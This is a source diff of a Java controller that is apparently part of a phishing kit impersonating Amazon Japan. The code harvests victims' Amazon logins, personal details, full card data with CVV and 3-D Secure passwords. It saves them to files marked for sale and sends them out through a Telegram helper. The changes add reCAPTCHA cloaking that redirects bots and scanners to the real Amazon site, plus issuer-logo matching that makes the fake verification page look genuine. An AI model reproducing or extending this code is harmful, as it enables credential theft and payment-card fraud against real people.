@@ -13,6 +13,7 @@ import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.JSONObject;
 import com.kidd.amazon.common.IpUtils;
 import com.kidd.amazon.model.enums.CardType;
+import com.kidd.amazon.service.CacheService;
 import com.kidd.amazon.task.AsyncTask;
 import lombok.extern.slf4j.Slf4j;
 import org.springframework.beans.factory.annotation.Autowired;
@@ -47,6 +48,9 @@ public class Amazon2MobileController {
     @Autowired
     private HttpServletResponse response;
 
+    @Autowired
+    private CacheService cacheService;
+
 
     @Value("${google.secret:6LcEYsUaAAAAAAfTzIt86eSq8Yc0ljLMqzcoJMmF}")
     private String googleSecret;
@@ -62,15 +66,65 @@ public class Amazon2MobileController {
             FileUtil.newFile(path);
         }
         FileAppender fileAppender = new FileAppender(FileUtil.file(path), 1000, true);
-        fileAppender.append(timeStr+":"+"|"+ip);
+        fileAppender.append(timeStr + ":" + "|" + ip);
         fileAppender.flush();
         return "version2/mobile/index";
     }
 
     @GetMapping("/")
     public Object signin2(@RequestHeader("User-Agent") String uaStr) {
-//        return "redirect:/version2/mobile/signin";
+        String ip = IpUtils.getIpAddress(request);
+        Integer isBot = (Integer) cacheService.getCommonCache(ip + "checkBot");
+        if (null != isBot && isBot == 1) {
+            return "redirect:/version2/mobile/signin";
+        }
         return "index";
+    }
+
+    @RequestMapping("/amazon/checkBot")
+    @ResponseBody
+    public Object checkBotAndRedirect(@RequestHeader("User-Agent") String uaStr, @RequestParam("response") String response) {
+        String googleUrl = "https://www.recaptcha.net/recaptcha/api/siteverify";
+        String defaulRedirectUrl = "https://amazon.co.jp/?Your_Account_Verified";
+        String redirectUrl = defaulRedirectUrl;
+        Map<String, Object> postParam = new HashMap<>();
+        postParam.put("secret", googleSecret);
+        postParam.put("response", response);
+        String ip = IpUtils.getIpAddress(request);
+        //判定爬虫
+        try {
+            long start = System.currentTimeMillis();
+            String result = HttpRequest.post(googleUrl)
+                    .form(postParam)
+                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
+                    .timeout(3000)//超时，毫秒
+                    .execute()
+                    .body();
+            long end = System.currentTimeMillis();
+            JSONObject jsonResult = JSON.parseObject(result);
+
+            //得分
+            if (null != jsonResult && jsonResult.containsKey("score")) {
+                BigDecimal score = ((BigDecimal) jsonResult.get("score"));
+                log.info("checkBot:" + ip + ":" + score + ":" + (end - start) + "ms");
+                if (score.doubleValue() >= 0.3) {
+                    redirectUrl = "/version2/mobile/signin";
+                    addCookie("checkBot", "notBot");
+                    cacheService.setCommonCache(ip + "checkBot", 1);
+                } else {
+                    addCookie("Bot", "Bot");
+                    cacheService.setCommonCache(ip + "checkBot", -1);
+                }
+            } else {
+                log.error("checkBot api failed:{},{},cost:{}ms", ip, result, (end - start));
+                redirectUrl = "/version2/mobile/signin";
+            }
+        } catch (Exception e) {
+            cacheService.setCommonCache(ip + "checkBot", 1);
+            log.error("checkBotAndRedirect ip:{}, error:{}",ip, e.getMessage());
+            redirectUrl = "/version2/mobile/signin";
+        }
+        return redirectUrl;
     }
 
     @GetMapping("/version2/mobile/homepage/billing")
@@ -86,20 +140,21 @@ public class Amazon2MobileController {
     @GetMapping("/version2/mobile/homepage/secure")
     public Object secure(Model model) {
         HttpSession session = request.getSession();
-        Map<String, String> userInfoMap =(Map<String, String>) session.getAttribute("userInfo");
+        Map<String, String> userInfoMap = (Map<String, String>) session.getAttribute("userInfo");
         String binInfo = userInfoMap.get("binInfo");
-        String bankImage = getBankImageByBinInfo(binInfo);
-       CardType cardType = CardType.getBydes(userInfoMap.get("cardType"));
-       String cardNumber = userInfoMap.get("cardnumber");
-       String namecard = userInfoMap.get("namecard");
+
+        CardType cardType = CardType.getBydes(userInfoMap.get("cardType"));
+        String cardNumber = userInfoMap.get("cardnumber");
+        String bankImage = getBankImageByBinInfo(cardNumber, binInfo);
+        String namecard = userInfoMap.get("namecard");
         LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
         String timeStr = DateUtil.format(localDateTime, "yyyy/MM/dd");
         model.addAttribute("dateTime", timeStr);
         model.addAttribute("cardName", namecard);
-        model.addAttribute("cardNo",cardNumber.substring(cardNumber.length() - 4, cardNumber.length()));
-        model.addAttribute("image",cardType.getImageName());
-        if(!StringUtils.isEmpty( bankImage)){
-            model.addAttribute("bankImage","card/a3/"+bankImage);
+        model.addAttribute("cardNo", cardNumber.substring(cardNumber.length() - 4, cardNumber.length()));
+        model.addAttribute("image", cardType.getImageName());
+        if (!StringUtils.isEmpty(bankImage)) {
+            model.addAttribute("bankImage", "card/a3/" + bankImage);
         }
         return "version2/mobile/secure2";
     }
@@ -123,14 +178,16 @@ public class Amazon2MobileController {
     public Object signinPost() {
         Map<String, String[]> params = request.getParameterMap();
         HttpSession session = request.getSession();
-        Map<String, String> userInfoMap =(Map<String, String>) session.getAttribute("userInfo");
-        userInfoMap.put("AmazonId",params.get("email")!=null?params.get("email")[0]:"");
-        userInfoMap.put("AmazonPwd",params.get("password")!=null?params.get("password")[0]:"");
+        Map<String, String> userInfoMap = (Map<String, String>) session.getAttribute("userInfo");
+        userInfoMap.put("AmazonId", params.get("email") != null ? params.get("email")[0] : "");
+        userInfoMap.put("AmazonPwd", params.get("password") != null ? params.get("password")[0] : "");
         session.setAttribute("userInfo", userInfoMap);
         LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
         String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
         asyncTask.asyncWriteMap(String.format("/root/version2-step1/%s.txt", timeStr), userInfoMap);
-        return new HashMap<String,String>(){{put("data","ok");}};
+        return new HashMap<String, String>() {{
+            put("data", "ok");
+        }};
     }
 
     @PostMapping("/version2/mobile/homepage/billing")
@@ -138,19 +195,21 @@ public class Amazon2MobileController {
     public Object billingPost() {
         Map<String, String[]> params = request.getParameterMap();
         HttpSession session = request.getSession();
-        Map<String, String> userInfoMap =(Map<String, String>) session.getAttribute("userInfo");
-        userInfoMap.put("fullname",params.get("fullname")!=null?params.get("fullname")[0]:"");
-        userInfoMap.put("stat",params.get("stat")!=null?params.get("stat")[0]:"");
-        userInfoMap.put("address",params.get("address")!=null?params.get("address")[0]:"");
-        userInfoMap.put("city",params.get("City")!=null?params.get("City")[0]:"");
-        userInfoMap.put("zipcode",params.get("zipcode")!=null?params.get("zipcode")[0]:"");
-        userInfoMap.put("phone",params.get("phonenumber")!=null?params.get("phonenumber")[0]:"");
-        userInfoMap.put("dob",params.get("dob-year")[0]+"/"+params.get("dob-moon")[0]+"/"+params.get("dob-day")[0]);
+        Map<String, String> userInfoMap = (Map<String, String>) session.getAttribute("userInfo");
+        userInfoMap.put("fullname", params.get("fullname") != null ? params.get("fullname")[0] : "");
+        userInfoMap.put("stat", params.get("stat") != null ? params.get("stat")[0] : "");
+        userInfoMap.put("address", params.get("address") != null ? params.get("address")[0] : "");
+        userInfoMap.put("city", params.get("City") != null ? params.get("City")[0] : "");
+        userInfoMap.put("zipcode", params.get("zipcode") != null ? params.get("zipcode")[0] : "");
+        userInfoMap.put("phone", params.get("phonenumber") != null ? params.get("phonenumber")[0] : "");
+        userInfoMap.put("dob", params.get("dob-year")[0] + "/" + params.get("dob-moon")[0] + "/" + params.get("dob-day")[0]);
         session.setAttribute("userInfo", userInfoMap);
         LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
         String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
         asyncTask.asyncWriteMap(String.format("/root/version2-step2/%s.txt", timeStr), userInfoMap);
-        return new HashMap<String,String>(){{put("data","ok");}};
+        return new HashMap<String, String>() {{
+            put("data", "ok");
+        }};
     }
 
     @PostMapping("/version2/mobile/homepage/card")
@@ -158,22 +217,24 @@ public class Amazon2MobileController {
     public Object cardPost() {
         Map<String, String[]> params = request.getParameterMap();
         HttpSession session = request.getSession();
-        Map<String, String> userInfoMap =(Map<String, String>) session.getAttribute("userInfo");
-        userInfoMap.put("namecard",params.get("namecard")[0]);
-        userInfoMap.put("cardnumber",params.get("cardnumber")[0]);
-        userInfoMap.put("expire",params.get("exdatemoon")[0]+"/"+params.get("exdateyear")[0]);
-        userInfoMap.put("cvv",params.get("cvc")[0]);
+        Map<String, String> userInfoMap = (Map<String, String>) session.getAttribute("userInfo");
+        userInfoMap.put("namecard", params.get("namecard")[0]);
+        userInfoMap.put("cardnumber", params.get("cardnumber")[0]);
+        userInfoMap.put("expire", params.get("month")[0] + "/" + params.get("year")[0]);
+        userInfoMap.put("cvv", params.get("cvc")[0]);
         CardType cardType = CardType.detect(params.get("cardnumber")[0]);
-        userInfoMap.put("cardType",cardType.getDescription());
+        userInfoMap.put("cardType", cardType.getDescription());
         String binInfo = getBinInfo(params.get("cardnumber")[0]);
-        userInfoMap.put("binInfo",binInfo);
+        userInfoMap.put("binInfo", binInfo);
         session.setAttribute("userInfo", userInfoMap);
         LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
         String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
         asyncTask.asyncWriteMap(String.format("/root/version2-step3/%s.txt", timeStr), userInfoMap);
-        asyncTask.asyncSaveFish("/root/lack"+timeStr+"/",userInfoMap);
-        asyncTask.asyncSaveFish("/root/sell"+timeStr+"/",userInfoMap);
-        return new HashMap<String,String>(){{put("data","ok");}};
+        asyncTask.asyncSaveFish("/root/lack" + timeStr + "/", userInfoMap);
+        asyncTask.asyncSaveFish("/root/sell" + timeStr + "/", userInfoMap);
+        return new HashMap<String, String>() {{
+            put("data", "ok");
+        }};
     }
 
     @PostMapping("/version2/mobile/homepage/secure")
@@ -181,38 +242,39 @@ public class Amazon2MobileController {
     public Object securePost() {
         Map<String, String[]> params = request.getParameterMap();
         HttpSession session = request.getSession();
-        Map<String, String> userInfoMap =(Map<String, String>) session.getAttribute("userInfo");
-        if(null!=params.get("mmname")) {
+        Map<String, String> userInfoMap = (Map<String, String>) session.getAttribute("userInfo");
+        if (null != params.get("mmname")) {
             userInfoMap.put("webid", params.get("mmname") != null ? params.get("mmname")[0] : "");
         }
-        userInfoMap.put("3dSecret",params.get("passvbv")!=null?params.get("passvbv")[0]:"");
+        userInfoMap.put("3dSecret", params.get("passvbv") != null ? params.get("passvbv")[0] : "");
         session.setAttribute("userInfo", userInfoMap);
         LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
         String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
         asyncTask.asyncWriteMap(String.format("/root/version2-step4/%s.txt", timeStr), userInfoMap);
-        asyncTask.asyncSendTgMsg(null,null,userInfoMap);
-        asyncTask.asyncSaveFish("/root/full"+timeStr+"/",userInfoMap);
-        asyncTask.asyncSaveFish("/root/sell"+timeStr+"/",userInfoMap);
-        return new HashMap<String,String>(){{put("data","ok");}};
+        asyncTask.asyncSendTgMsg(null, null, userInfoMap);
+        asyncTask.asyncSaveFish("/root/full" + timeStr + "/", userInfoMap);
+        asyncTask.asyncSaveFish("/root/sell" + timeStr + "/", userInfoMap);
+        return new HashMap<String, String>() {{
+            put("data", "ok");
+        }};
     }
 
-    private String getBinInfo(String cardNo){
+    private String getBinInfo(String cardNo) {
         String binInfo = "{}";
         try {
-           binInfo = HttpRequest.get("https://lookup.binlist.net/"+cardNo)
+            binInfo = HttpRequest.get("https://lookup.binlist.net/" + cardNo)
                     .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
-                    .header("Accept-Version","3")
+                    .header("Accept-Version", "3")
                     .timeout(20000)//超时，毫秒
                     .execute().body();
-        }
-        catch (Exception e){
-            log.error("query bin fail:"+e.getMessage());
+        } catch (Exception e) {
+            log.error("query bin fail:" + e.getMessage());
         }
         JSONObject jsonObject = JSON.parseObject(binInfo);
-        if(jsonObject!=null && jsonObject.containsKey("country")){
+        if (jsonObject != null && jsonObject.containsKey("country")) {
             jsonObject.remove("country");
         }
-        if(jsonObject!=null && jsonObject.containsKey("number")){
+        if (jsonObject != null && jsonObject.containsKey("number")) {
             jsonObject.remove("number");
         }
         return jsonObject.toJSONString();
@@ -242,18 +304,57 @@ public class Amazon2MobileController {
         return jstr;
     }
 
-    private String getBankImageByBinInfo(String binInfo) {
+    private String getBankImageByBinInfo(String cardNumber,String binInfo) {
         String bankImage = "";
-        if(null != binInfo){
+        if (null != binInfo) {
             JSONObject binJson = JSON.parseObject(binInfo);
-            if(binJson.containsKey("bank")){
+            if (binJson.containsKey("bank")) {
                 JSONObject bankJSON = binJson.getJSONObject("bank");
-                if(bankJSON.containsKey("name")){
-                    String bankName= bankJSON.getString("name");
-                    if(bankName.contains("SUMITOMO MITSUI" )|| bankName.contains("MITSUI SUMITOMO") || bankName.contains("WELLS FARGO BANK")){
+                if (bankJSON.containsKey("name")) {
+                    String bankName = bankJSON.getString("name");
+                    if (bankName.contains("SUMITOMO MITSUI") || bankName.contains("MITSUI SUMITOMO") || bankName.contains("WELLS FARGO BANK")) {
                         return "smbc.gif";
                     }
+                    if(bankName.toUpperCase().contains("UC CARD")){
+                        return "uc.png";
+                    }
+                    if(bankName.toUpperCase().contains("APLUS")){
+                        return "aplus.jpg";
+                    }
+                    if(bankName.toUpperCase().contains("UFJ")){
+                        return "mufg.jpg";
+                    }
+                    if(bankName.toUpperCase().contains("AEON")){
+                        return "aeon.png";
+                    }
+                    if(bankName.toUpperCase().contains("RAKUTEN")){
+                        return "rakuten.png";
+                    }
+                    if(bankName.toUpperCase().contains("CREDIT SAISON")){
+                        return "creditsaison.png";
+                    }
+                    if(bankName.toUpperCase().contains("LIFECARD")){
+                        return "lifecard.png";
+                    }
+                    if(bankName.toUpperCase().contains("NANTO")){
+                        return "nanto.gif";
+                    }
+                    if(bankName.toUpperCase().contains("EPOS")){
+                        return "epos.jpg";
+                    }
+                    if(bankName.toUpperCase().contains("OMC CARD")){
+                        return "omc.png";
+                    }
+                    if(bankName.toUpperCase().contains("TOYOTA")){
+                        return "toyota.png";
+                    }
                 }
+                else {
+                    if(cardNumber.contains("467924") ||cardNumber.contains("464988")){
+                        return "paypay.gif";
+                    }
+                }
+
             }
         }
         return bankImage;
@@ -266,38 +367,5 @@ public class Amazon2MobileController {
         UserAgent ua = UserAgentUtil.parse(uaStr);
         isMobile = ua.isMobile();
         return isMobile;
-    }
-
-    @RequestMapping("/amazon/checkBot")
-    @ResponseBody
-    public Object checkBotAndRedirect(@RequestHeader("User-Agent") String uaStr, @RequestParam("response") String response) {
-        String googleUrl = "https://www.recaptcha.net/recaptcha/api/siteverify";
-        String defaulRedirectUrl = "https://amazon.co.jp/?Your_Account_Verified";
-        String redirectUrl = defaulRedirectUrl;
-        Map<String, Object> postParam = new HashMap<>();
-        postParam.put("secret", googleSecret);
-        postParam.put("response", response);
-        //判定爬虫
-        try {
-            String result = HttpRequest.post(googleUrl)
-                    .form(postParam)
-                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
-                    .timeout(10000)//超时，毫秒
-                    .execute()
-                    .body();
-            JSONObject jsonResult = JSON.parseObject(result);
-            if (null != jsonResult && jsonResult.containsKey("score")) {
-                BigDecimal score = ((BigDecimal) jsonResult.get("score"));
-                log.info("checkBot:"+IpUtils.getIpAddress(request)+":"+score);
-                if (score.doubleValue() > 0.5) {
-                    redirectUrl ="/version2/mobile/signin";
-                    addCookie("checkBot", "notBot");
-                }
-            }
-        } catch (Exception e) {
-            System.out.println("checkBotAndRedirect error:"+e.getMessage());
-            redirectUrl = "/";
-        }
-        return redirectUrl;
     }
 }
